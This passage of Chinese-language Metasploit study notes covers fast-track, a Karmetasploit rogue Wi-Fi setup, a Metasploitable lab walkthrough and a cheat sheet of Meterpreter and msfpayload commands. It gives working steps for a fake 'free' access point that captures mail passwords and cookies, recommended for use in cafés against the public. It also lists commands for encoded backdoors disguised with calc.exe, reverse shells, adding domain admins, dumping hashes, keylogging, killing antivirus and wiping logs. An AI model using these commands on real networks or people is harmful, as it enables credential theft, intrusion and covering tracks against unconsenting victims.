和浏览器攻击差不多，但是增加了对目标的ARP缓冲区和DNS感染（只能是在测试者 和目标处于同一网段的情况下），以及MSF里面没有的浏览器溢出exploit。当目标浏览 恶意网站的时候，fast-track尝试着使用所有的exp对目标机器进行溢出，一旦某个exp 起作用将获取到目标机器的控制权限。

（新版本fasttrack中还加入了Autopwn Automation、Nmap Scripting Engine、Exploits、Payload Generator等新功能。）

脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。


## 十二．KARMERASPLOIT

Karmetasploit = Karma + Metasploit，也可以说成它是MSF的KARMA实现。

Karma和MSF一样也是使用ruby语言编写的，其功能是建立一个虚假的无线接入点，等待目标连接上钩。与MSF结合可实现更强大的功能。Karmetasploit集成了DNS,POP3，IMAP4，SMTP,FTP,SMB,HTTP等服务用于攻击，模块位于modules/auxiliary/server目录下。

基本配置：

需要的配置不多，首先需要配置一个DHCP服务为目标提供动态IP分配，配置文件：

```
option domain-name-servers 10.0.0.1;
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
range 10.0.0.100 10.0.0.254;
option routers 10.0.0.1;
option domain-name-servers 10.0.0.1;
}
```

将配置文件保存在/etc/dhcp3/dhcpd.conf

下一步下载karma  msf脚本：

```
wget http://www.offensive-security.com/downloads/karma.rc
#将网卡激活为监听模式：
airmon-ng start wlan0
#创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性），-v 指定网卡，mon0为上一步完成后生成的：
airbase-ng -P -C 30 -e "China-Net-Free" -v mon0
#此时会生成一个名为at0的新网卡接口。
#接着打开DHCP服务：
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0
#检查是否成功启动：
ps aux|grep dhcpd
tail -f /var/log/messages

#下一步加载karma脚本：
msf> resource karma.rc
```

等待收获：

当对方打开邮件客户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的DNS和POP3都是虚假的。
当对方打开浏览器准备浏览网页时karma开始截取cookie，建立虚假email，DNS等服务，加载exploits来对付客户端浏览器，如果走运的话可以获取到shell。
总结：建议这招可以拿到麦当劳，星巴克用，效果更好。


## 十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程


这三章留着后面看，需要有ruby基础等编程基础。


## 十四．渗透实战演习

首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：

http://updates.metasploit.com/data/Metasploitable.zip.torrent


虚拟机IP：172.16.32.162 用户名密码：msfadmin

WINXP：172.16.32.131   开放80端口 有防火墙

情报收集：

`nmap -sT -P0 172.16.32.131`

msfconsole：

```
cd /opt/framework3/msf3/
msfconsole
msf> use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 172.15.32.129
set lport 443
load auto_add_route
exploit -j

run getgui -e -f 8080
shell
net user msf msf /add
net localgroup administrators msf /add
upload nmap.exe
nmap.exe -sT -A -P0 172.16.32.162
msf> use auxiliary/scanner/ftp/ftp_version
set RHOSTS 172.16.32.162
run

msf> use auxiliary/scanner/smtp/smtp_version
set RHOSTS  172.16.32.162
run

search tomcat_mgr_login
set rhosts 172.16.32.162
set threads 50
set rport 8180
set verbose false
run

use multi/http/tomcat_mgr_deploy
set password tomcat
set username tomcat
set rhost 172.16.32.162
set lport 9999
set rport 8180
set payload linux/x86/shell_bind_tcp
exploit

search distcc_exec
set payload linux/x86/shell_reverse_tcp
set lhost 172.16.32.129
set rhost 172.16.32.162
show payloads
set payload cmd/unix/reverse
exploit
```

## 十五．常用命令备忘


### MSFconsole  Commands

* show exploits 查看所有exploit
* show payloads 查看所有payload
* show auxiliary 查看所有auxiliary
* search name 搜索exploit等
* info 查看加载模块的信息
* use name 加载模块
* LHOST 本机IP
* RHOST 目标IP
* set function 设置选项值
* setg function  全局设置
* show options 查看选项
* show targets 查看exp可选的平台
* set target num 设置exp作用平台
* set payload payload  设置payload
* show advanced 查看高级选项
* set autorunscript migrate -f 设置自动执行指令
* check 测试是否可利用
* exploit 执行exp或模块
* exploit  -j 作为后台执行
* exploit  -z 成功后不立即打开session
* exploit  -e encoder 指定encoder
* exploit  -h  查看帮助信息
* sessions  -l -v 列出可用sessions详细信息
* sessions  -s script 在指定session执行脚本
* sessions -K 结束session
* sessions -c cmd 执行指定命令
* sessions -u sessionID 升级shell
* db_create name 创建数据库
* db_connect name   连接数据库
* db_nmap nmap扫描并导入结果
* db_autopwn -h      查看autopwn帮助
* db_autopwn -p -r -e 基于端口，反弹shell
* db_destroy 删除数据库

### Meterpreter Commands

* help 查看帮助
* run scriptname 运行脚本
* sysinfo 系统基本信息
* ls 列目录
* use priv 运行提权组件
* ps 列进程
* migrate PID PID迁移
* use incognito token窃取
* list_tokens -u 查看可用用户token
* list_tokens -g 查看可用组token
* impersonate_token DOMAIN_NAME\\USERNAME 模仿token
* steal_token PID 窃取PID所属token并模仿
* drop_token 停止模仿token
* getsystem 获取SYSTEM权限
* shell 运行shell
* execute -f cmd.exe -i 交互式运行cmd
* execute -f cmd.exe -i -t 使用可用token运行
* execute -f cmd.exe -i -H -t 同上，同时隐藏进程
* rev2self 返回至初始用户
* reg command 修改注册表
* setkesktop number 切换至另一已登录用户屏幕
* screenshot 截屏
* upload file 上传文件
* download file  下载文件
* keyscan_start 开始截取击键记录
* keyscan_stop 停止截取击键记录
* getprivs 尽可能提升权限
* uictl enable keyboard/mouse 获取键盘或鼠标的控制权
* background 将当前meterpreter shell转入后台
* hashdump 导出所有用户hash
* use sniffer 加载嗅探模块
* sniffer_interfaces 查看可用网卡接口
* sniffer_dump interfaceID pcapname 开始嗅探
* sniffer_start interfaceID packet-buffer 指定buffer范围嗅探
* sniffer_stats interfaceID   抓取统计信息
* sniffer_stop interfaceID  停止嗅探
* add_user username password -h ip 添加用户
* add_group_user "Domain Admins" username -h ip 添加用户至管理组
* clearev 清空日志
* timestomp 改变文件属性如创建时间等
* reboot 重启


### MSFpayload Commands

* msfpayload -h 查看帮助
* msfpayload windows/meterpreter/bind_tcp 0 查看指定payload可用选项
* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 X > payload.exe 生成payload.exe
* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R > payload.raw 保存为RAW格式，可用于msfencode
* msfpayload windows/meterpreter/bind_tcp LPORT=443 C > payload.c 保存为C格式
* msfpayload windows/meterpreter/bind_tcp LPORT=443 J > payload.java 保存为java格式

### MSFencode Commands

* msfencode -h 查看帮助
* msfencode -l 查看可用encoder
* msfencode -t (c,elf.exe,java.js_le,js_be,perl,raw,ruby,vba,vbs,loop-vbs,asp,war,macho) 以指定格式显示编码后的buffer
* msfencode -i payload.raw -o encoded_payload.exe -e x86/shikata_ga_nai -c 5 -t exe 生成编码后的exe
* msfencode -i payload.raw BufferRegister=ESI -e x86/alpha_mixed -t c 生成纯字符格式C类型shellcode
* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | \
  msfencode -e x86/countdown -c 5 -t raw | \
  msfencode -e x86/shikata_ga_nai -c 5 -t exe -o multi-encoded.exe 多编码器结合，多次编码

### MSFcli Commands

* `msfcli | grep exploit` 只显示exploit
* `msfcli | grep exploit/windows` 只显示windows exploit
* `msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 RHOST=172.16.32.26 E` 针对指定IP加载指定exp并设定payload


### MSF,Ninja，Fu
```
* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc.exe -k -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 使用calc.exe作为模板，生成经过编码的后门
* msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 R | msfencode -x calc,exe -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe 与上面差不多，只是执行的时候不依赖于生成的可执行文件，且不会有任何提示信息
* msfpayload windows/meterpreter/bind_tcp LPORT=443 R | msfencode -o payload.exe -e x86/shikata_ga_nai -c 7 -t exe && msfcli multi/hanler PAYLOAD=windows/meterpreter/bind_tcp LPORT=443 E 生成编码后的payload并开始监听本机端口
```

### MSFvenom

* msfvenom --payload 自动生成payload


### Meterpreter Post Exploitation Commands

提权一般步骤
```
meterpreter> use priv
meterpreter> getsystem
meterpreter> ps 
meterpreter> steal_token 1784
meterpreter> shell
net user msf msf /add /DOMAIN
net group "Domain Admins" msf /add /DOMAIN
```

获取hash一般步骤

```
meterpreter> use priv
meterpreter> getsystem
meterpreter> hashdump
```

如果是在win2008系统上：
```
meterpreter> run migrate
meterpreter> run killav
meterpreter> ps 
meterpreter> migrate 1436
meterpreter> keyscan_start
meterpreter> keyscan_dump
meterpreter> keyscan_stop
```

使用Incognito提权

```
meterpreter> use incognito
meterpreter> list_tokens -u
meterpreter> use priv
meterpreter> getsystem
meterpreter> list_tokens -u
meterpreter> impersonate_token IHAZSECURITY\\Administrator
```

查看保护机制并禁用之

```
meterpreter> run getcountermeasure
meterpreter> run getcountermeasure -h
meterpreter> run getcountermeasure -d -k
```

* meterpreter> run checkvm 检查是否是虚拟机
* meterpreter> shell 转入命令行
* meterpreter> run vnc 远程VNC控制
* meterpreter> background 转入后台
* meterpreter> run post/windows/escalate/bypassuac 执行Bypass UAC
* meterpreter> run post/osx/gather/hashdump 在OS X系统上dump hash
* meterpreter> run post/linux/gather/hashdump 在Linux 系统上dump hash
